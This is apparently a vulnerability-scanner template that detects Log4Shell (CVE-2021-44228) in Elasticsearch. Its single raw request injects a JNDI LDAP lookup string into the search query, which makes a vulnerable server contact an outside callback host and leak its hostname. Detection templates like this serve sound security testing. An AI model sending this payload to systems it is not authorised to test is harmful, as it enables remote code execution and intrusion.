id: elasticsearch-log4j
info:
  author: c-sh0
  description: Log4Shell elasticsearch detection
  name: Java logging library log4j (version 2) was discovered that results in Remote
    Code Execution (RCE), by logging a certain string.
  reference:
  - https://github.com/elastic/elasticsearch/issues/81618
  - https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
  severity: high
  tags: rce,jndi,log4j,elastic,elasticsearch
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET /_search?source=${jndi:ldap://${hostName}.{{interactsh-url}}/x} HTTP/1.1

    Host: {{Hostname}}

    '
